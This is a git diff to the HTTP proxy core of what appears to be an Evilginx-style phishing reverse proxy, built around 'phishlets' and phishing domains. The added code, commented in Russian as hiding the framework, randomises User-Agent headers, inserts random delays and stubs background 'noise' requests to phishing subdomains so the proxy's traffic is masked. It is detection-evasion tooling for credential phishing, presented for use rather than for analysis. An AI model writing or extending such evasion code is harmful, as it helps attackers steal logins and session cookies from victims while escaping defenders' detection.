@@ -1,0 +1,95 @@
+[1mdiff --git a/core/http_proxy.go b/core/http_proxy.go[m
+[1mindex a952ae6..4b1f296 100644[m
+[1m--- a/core/http_proxy.go[m
+[1m+++ b/core/http_proxy.go[m
+[36m@@ -636,6 +636,18 @@[m [mfunc NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da[m
+                 // prevent caching[m
+                 req.Header.Set("Cache-Control", "no-cache")[m
+ [m
+[32m+[m[32m                // Устанавливаем случайный User-Agent для скрытия фреймворка[m
+[32m+[m[32m                req.Header.Set("User-Agent", getRandomUserAgent())[m
+[32m+[m
+[32m+[m[32m                // Добавляем случайную задержку для скрытия фреймворка[m
+[32m+[m[32m                addRandomDelay()[m
+[32m+[m
+[32m+[m[32m                // Генерируем фоновые запросы для маскировки[m
+[32m+[m[32m                if pl != nil {[m
+[32m+[m[32m                    phishDomain, _ := p.cfg.GetSiteDomain(pl.Name)[m
+[32m+[m[32m                    generateNoiseRequest(pl, phishDomain)[m
+[32m+[m[32m                }[m
+[32m+[m
+                 // fix sec-fetch-dest[m
+                 sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")[m
+                 if sec_fetch_dest != "" {[m
+[36m@@ -1928,6 +1940,71 @@[m [mfunc (p *HttpProxy) getSessionIdByIP(ip_addr string, hostname string) (string, b[m
+     return "", false[m
+ }[m
+ [m
+[32m+[m[32m// Пул реалистичных User-Agent строк для скрытия фреймворка[m
+[32m+[m[32mfunc getRandomUserAgent() string {[m
+[32m+[m[32m    userAgents := []string{[m
+[32m+[m[32m        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",[m
+[32m+[m[32m        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",[m
+[32m+[m[32m        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",[m
+[32m+[m[32m        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",[m
+[32m+[m[32m        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",[m
+[32m+[m[32m        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",[m
+[32m+[m[32m        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/121.0",[m
+[32m+[m[32m        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",[m
+[32m+[m[32m        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0",[m
+[32m+[m[32m        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",[m
+[32m+[m[32m    }[m
+[32m+[m[41m    [m
+[32m+[m[32m    seed := make([]byte, 1)[m
+[32m+[m[32m    rand.Read(seed)[m
+[32m+[m[32m    index := int(seed[0]) % len(userAgents)[m
+[32m+[m[32m    return userAgents[index][m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32m// Добавляем случайную задержку для скрытия фреймворка[m
+[32m+[m[32mfunc addRandomDelay() {[m
+[32m+[m[32m    seed := make([]byte, 1)[m
+[32m+[m[32m    rand.Read(seed)[m
+[32m+[m[32m    delay := time.Duration(50+int(seed[0])%200) * time.Millisecond // 50-250ms[m
+[32m+[m[32m    time.Sleep(delay)[m
+[32m+[m[32m}[m
+[32m+[m
+[32m+[m[32m// Генерируем фоновые запросы для маскировки трафика[m
+[32m+[m[32mfunc generateNoiseRequest(pl *Phishlet, phishDomain string) {[m
+[32m+[m[32m    seed := make([]byte, 1)[m
+[32m+[m[32m    rand.Read(seed)[m
+[32m+[m[41m    [m
+[32m+[m[32m    // 30% шанс сгенерировать шумовой запрос[m
+[32m+[m[32m    if int(seed[0])%10 < 3 {[m
+[32m+[m[32m        noisePaths := []string{[m
+[32m+[m[32m            "/favicon.ico",[m
+[32m+[m[32m            "/robots.txt",[m
+[32m+[m[32m            "/sitemap.xml",[m
+[32m+[m[32m            "/manifest.json",[m
+[32m+[m[32m            "/apple-touch-icon.png",[m
+[32m+[m[32m            "/browserconfig.xml",[m
+[32m+[m[32m        }[m
+[32m+[m[41m        [m
+[32m+[m[32m        pathIndex := int(seed[0]) % len(noisePaths)[m
+[32m+[m[32m        noisePath := noisePaths[pathIndex][m
+[32m+[m[41m        [m
+[32m+[m[32m        // Генерируем случайный домен[m
+[32m+[m[32m        if len(pl.proxyHosts) > 0 {[m
+[32m+[m[32m            hostIndex := int(seed[0]) % len(pl.proxyHosts)[m
+[32m+[m[32m            ph := pl.proxyHosts[hostIndex][m
+[32m+[m[32m            fakeHost := combineHost(ph.phish_subdomain, phishDomain)[m
+[32m+[m[41m            [m
+[32m+[m[32m            // Создаем фейковый запрос в фоне[m
+[32m+[m[32m            go func() {[m
+[32m+[m[32m                time.Sleep(time.Duration(100+int(seed[0])%500) * time.Millisecond)[m
+[32m+[m[41m                [m
+[32m+[m[32m                // Здесь можно добавить реальный HTTP запрос для шума[m
+[32m+[m[32m                log.Debug("Generated noise request to %s%s", fakeHost, noisePath)[m
+[32m+[m[32m            }()[m
+[32m+[m[32m        }[m
+[32m+[m[32m    }[m
+[32m+[m[32m}[m
+[32m+[m
+ func (p *HttpProxy) setProxy(enabled bool, ptype string, address string, port int, username string, password string) error {[m
+     if enabled {[m
+         ptypes := []string{"http", "https", "socks5", "socks5h"}[m
